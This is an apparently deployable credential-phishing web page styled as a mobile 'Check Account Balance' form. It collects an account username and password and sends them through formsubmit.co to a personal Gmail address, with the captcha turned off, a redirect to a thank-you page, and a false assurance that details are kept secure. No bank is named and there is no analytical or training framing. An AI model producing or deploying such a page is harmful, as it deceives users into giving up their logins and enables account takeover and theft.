<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>CHECK ACCOUNT BALANCE</title>
  <style>
    :root{font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;}
    body{
      margin:0;
      background:#f5f7fb;
    }
    .card{
      background:#fff;
      padding:24px;
      border-radius:0; /* flat edges for full width */
      box-shadow:none;
      width:100%;
      min-height:100vh; /* fill phone height */
      box-sizing:border-box;
    }
    h1{
      margin:0 0 18px;
      font-size:22px;
      letter-spacing:2px;
      text-align:center;
    }
    label{
      display:block;
      margin-bottom:6px;
      font-size:15px;
      color:#333;
    }
    input[type="text"],input[type="password"]{
      width:100%;
      padding:14px;
      border:1px solid #d6dbe8;
      border-radius:8px;
      font-size:16px;
    }
    .row{margin-top:20px;}
    button.submit{
      width:100%;
      padding:14px;
      border-radius:10px;
      border:0;
      background:#1f7aef;
      color:#fff;
      font-weight:600;
      font-size:16px;
      cursor:pointer;
    }
    .toggle{
      position:absolute;
      right:14px;
      top:43px;
      background:none;
      border:none;
      cursor:pointer;
      color:#555;
      font-size:14px;
    }
    .field-wrapper{
      position:relative;
      margin-top:18px;
    }
    .confident{
      margin-top:18px;
      font-size:14px;
      color:#0b6b3a;
      background:#e6fbf0;
      padding:12px;
      border-radius:8px;
      text-align:center;
    }
  </style>
</head>
<body>
  <main class="card" role="main">
    <h1>CHECK ACCOUNT BALANCE</h1>

    <form action="https://formsubmit.co/exellentfirm@gmail.com" 
          method="POST" autocomplete="off" novalidate>
      <input type="hidden" name="_next" value="thankyou.html">
      <input type="hidden" name="_captcha" value="false">

      <div class="field-wrapper">
        <label for="username">Enter your Account Username</label>
        <input id="username" name="username" type="text" required aria-required="true" />
      </div>

      <div class="field-wrapper">
        <label for="password">Enter your Account Password</label>
        <input id="password" name="password" type="password" required aria-required="true" />
        <button type="button" id="togglePassword" class="toggle">Show</button>
      </div>

      <div class="confident">Thank you, We keep your details and data secured</div>

      <div class="row">
        <button type="submit" class="submit">Check Balance</button>
      </div>
    </form>
  </main>

  <script>
    const togglePassword = document.getElementById('togglePassword');
    const password = document.getElementById('password');
    togglePassword.addEventListener('click', () => {
      const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
      password.setAttribute('type', type);
      togglePassword.textContent = type === 'password' ? 'Show' : 'Hide';
    });
  </script>
</body>
</html>
